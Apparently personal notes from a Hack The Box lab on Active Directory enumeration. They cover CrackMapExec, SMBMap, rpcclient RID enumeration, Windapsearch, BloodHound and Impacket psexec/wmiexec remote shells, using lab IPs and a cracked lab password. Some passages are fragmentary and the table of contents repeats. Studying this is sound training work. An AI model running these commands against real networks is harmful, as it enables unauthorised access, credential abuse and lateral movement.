## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [CrackMapExec](#crackmapexec)
      - [CME - Domain User Enumeration](#CME\-\Domain\User\Enumeration)
      - [CME - Domain Group Enumeration](#CME\-\Domain\Group\Enumeration)
      - [CME - Logged On Users](#CME\-\Logged\On\Users)
      - [CME Share Searching](#CME\Share\Searching)
      - [Share Enumeration - Domain Controller](#Share\Enumeration\-\Domain\Controller)
      - [Spider_plus](#Spider_plus)
- [SMBMap](#smbmap)
      - [SMBMap to check access](#SMBMap\to\check\access)
      - [Recursive List Of All Directories](#Recursive\List\Of\All\Directories)
  - [rpcclient](#rpcclient)
      - [rpcclient Enumeration](#rpcclient\Enumeration)
      - [RPCClient User Enumeration By RID](#RPCClient\User\Enumeration\By\RID)
      - [Enumdomusers](#Enumdomusers)
      - [Using psexec.py](#Using\psexec.py)
      - [wmiexec.py](#wmiexec.py)
      - [Using wmiexec.py](#Using\wmiexec.py)
  - [Windapsearch](#Windapsearch)
      - [Windapsearch - Domain Admins](#Windapsearch\-\Domain\Admins)
      - [Windapsearch - Privileged Users](#Windapsearch\-\Privileged\Users)
      - [BloodHound.py Options](#BloodHound.py\Options)
      - [Executing BloodHound.py](#Executing\BloodHound.py)
      - [Upload the Zip File into the BloodHound GUI](#Upload\the\Zip\File\into\the\BloodHound\GUI)

## Table of Contents

- [CrackMapExec](#crackmapexec)
      - [CME - Domain User Enumeration](#CME\-\Domain\User\Enumeration)
      - [CME - Domain Group Enumeration](#CME\-\Domain\Group\Enumeration)
      - [CME - Logged On Users](#CME\-\Logged\On\Users)
      - [CME Share Searching](#CME\Share\Searching)
      - [Share Enumeration - Domain Controller](#Share\Enumeration\-\Domain\Controller)
      - [Spider_plus](#Spider_plus)
- [SMBMap](#smbmap)
      - [SMBMap to check access](#SMBMap\to\check\access)
      - [Recursive List Of All Directories](#Recursive\List\Of\All\Directories)
  - [rpcclient](#rpcclient)
      - [rpcclient Enumeration](#rpcclient\Enumeration)
      - [RPCClient User Enumeration By RID](#RPCClient\User\Enumeration\By\RID)
      - [Enumdomusers](#Enumdomusers)
      - [Using psexec.py](#Using\psexec.py)
      - [wmiexec.py](#wmiexec.py)
      - [Using wmiexec.py](#Using\wmiexec.py)
  - [Windapsearch](#Windapsearch)
      - [Windapsearch - Domain Admins](#Windapsearch\-\Domain\Admins)
      - [Windapsearch - Privileged Users](#Windapsearch\-\Privileged\Users)
      - [BloodHound.py Options](#BloodHound.py\Options)
      - [Executing BloodHound.py](#Executing\BloodHound.py)
      - [Upload the Zip File into the BloodHound GUI](#Upload\the\Zip\File\into\the\BloodHound\GUI)


# CrackMapExec
```shell-session
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM

Ya feelin' a bit buggy all of a sudden?
```

CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:

- -u Username `The user whose credentials we will use to authenticate`
- -p Password `User's password`
- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
- --users `Specifies to enumerate Domain Users`
- --groups `Specifies to enumerate domain groups`
- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`



#### CME - Domain User Enumeration

We start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their `badPwdCount` attribute above 0 to be extra careful not to lock any accounts out.

  CME - Domain User Enumeration

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

#### CME - Domain Group Enumeration

  CME - Domain Group Enumeration

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

#### CME - Logged On Users

We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.

  CME - Logged On Users

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

#### CME Share Searching

We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.

#### Share Enumeration - Domain Controller

  Share Enumeration - Domain Controller

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

#### Spider_plus

  Spider_plus

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```




___
# SMBMap
https://github.com/ShawnDEvans/smbmap
- Enumerating SMB shares from linx host
	- list shares, permissions, and share contents
- Needs active domain user creds.

#### SMBMap to check access
```bash
smbmap -u forend -p Klmcargo2 0d INLANEFREIGHT.LOCAL -H MACHINE_IP
```


#### Recursive List Of All Directories

  Recursive List Of All Directories

```shell
gdxqpardo@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```




## rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD


) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:

Code: bash

```bash
rpcclient -U "" -N 172.16.5.5
```

#### rpcclient Enumeration

While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

However, there are a


Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500.


#### RPCClient User Enumeration By RID

  RPCClient User Enumeration By RID

```shell-session
rpcclient $> queryuser 0x457
```


When we searched for information using the `queryuser` command against the RID `0x457`, RPC returned the user information for `htb-student` as expected. This wasn't hard since we already knew the RID for `htb-student`. If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command.

#### Enumdomusers

  Enumdomusers

```shell
rpcclient $> enumdomusers
```


 The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.




#### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

Code: bash

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```


#### wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

#### Using wmiexec.py

Code: bash

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```


## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

```bash
windapsearch.py [-h] 
[-d DOMAIN] 
[--dc-ip DC_IP] 
[-u USER]                       
[-p PASSWORD] 
[--functionality] 
#Enumeration options
[-G] - groups
[-U] - users
[-PU] - Privileged Users
[-C]                   

[-m GROUP_NAME] 
[--da] 
[--admin-objects] 
[--user-spns]
[--unconstrained-users]
[--unconstrained-computers]
[--gpos]
[-s SEARCH_TERM]
[-l DN]                       
[--custom CUSTOM_FILTER] 
[-r] 
[--attrs ATTRS]
[--full]                       
[-o output_dir]
```



#### Windapsearch - Domain Admins

  Windapsearch - Domain Admins

```shell-session
gdxqpardo@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

#### Windapsearch - Privileged Users

  Windapsearch - Privileged Users

```shell-session
gdxqpardo@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```





#### BloodHound.py Options

```bash
optional arguments:
  -h, --help            show this help message and exit
  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
                        Which information to collect. Supported: Group,
                        LocalAdmin, Session, Trusts, Default (all previous),
                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
                        You can specify more than one by separating them with
                        a comma. (default: Default)
  -u USERNAME, --username USERNAME
                        Username. Format: username[@domain]; If the domain is
                        unspecified, the current domain is used.
  -p PASSWORD, --password PASSWORD
                        Password
```


#### Executing BloodHound.py

  Executing BloodHound.py

```shell
gdxqpardo@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

#### Upload the Zip File into the BloodHound GUI

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:


https://wadcoms.github.io/#+Linux























